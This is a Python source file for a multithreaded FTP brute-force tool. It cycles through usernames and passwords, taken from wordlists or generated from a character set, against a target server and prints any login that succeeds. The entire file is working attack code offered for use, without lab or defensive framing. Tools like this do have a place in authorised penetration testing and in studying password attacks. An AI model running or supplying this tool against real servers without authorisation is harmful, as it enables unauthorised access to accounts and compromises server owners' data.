import ftplib
from threading import Thread
import queue
from colorama import init, Fore
import sys
import argparse
import string
import itertools

init(autoreset=True)

q = queue.Queue()
found = False


def connect_ftp(host, port, q):
    global found
    while not q.empty() and not found:  # stop if queue is empty or credentials found
        user, password = q.get()

        try:
            with ftplib.FTP() as server:
                print(f'[!] Trying: {user}:{password}')
                server.connect(host, port, timeout=5)
                server.login(user, password)

                print(f"{Fore.GREEN}[+] Found credentials:")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f"\tPassword: {password}{Fore.RESET}")
            found = True
            sys.exit(0)

        except ftplib.error_perm:
            # wrong user/pass
            pass

        except Exception as e:
            if "10054" in str(e):  # Handle forcibly closed connection
                print(f"{Fore.YELLOW}[!] Connection reset by server, retrying...{Fore.RESET}")
                q.put((user, password))  # put it back for retry
            else:
                print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")

        finally:
            q.task_done()


def load_lines(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()


def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)


def main():
    parser = argparse.ArgumentParser(description='FTP Brute Force')
    parser.add_argument('--host', type=str, required=True, help='FTP server host or IP.')
    parser.add_argument('--port', type=int, default=21, help='FTP server port. Default is 21.')
    parser.add_argument('-t', '--threads', type=int, default=30, help='Number of threads to use.')
    parser.add_argument('-u', '--user', type=str, help='A single username.')
    parser.add_argument('-U', '--userlist', type=str, help='Path to the usernames list.')
    parser.add_argument('-w', '--wordlist', type=str, help='Path to the passwords list.')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate passwords on the fly.')
    parser.add_argument('--min_length', type=int, default=1, help='Minimum length for password generation.')
    parser.add_argument('--max_length', type=int, default=4, help='Maximum length for password generation.')
    parser.add_argument('-c', '--chars', type=str, default=string.ascii_letters + string.digits,
                        help='Characters to use for password generation.')

    args = parser.parse_args()

    host = args.host
    port = args.port
    n_threads = args.threads

    if not args.user and not args.userlist:
        print("Please provide a single username (-u) or userlist (-U).")
        sys.exit(1)

    if args.userlist:
        users = load_lines(args.userlist)
    else:
        users = [args.user]

    if args.wordlist:
        passwords = load_lines(args.wordlist)
        print(f"[+] Loaded {len(passwords)} passwords from wordlist")
    elif args.generate:
        passwords = list(generate_passwords(args.min_length, args.max_length, args.chars))
        print(f"[+] Generated {len(passwords)} passwords on the fly")
    else:
        print('Please provide a wordlist (-w) or enable generation (-g).')
        sys.exit(1)

    print(f"[+] Usernames to try: {len(users)}")

    for user in users:
        for password in passwords:
            q.put((user, password))

    for _ in range(n_threads):
        thread = Thread(target=connect_ftp, args=(host, port, q))
        thread.daemon = True
        thread.start()

    q.join()


if __name__ == '__main__':
    main()
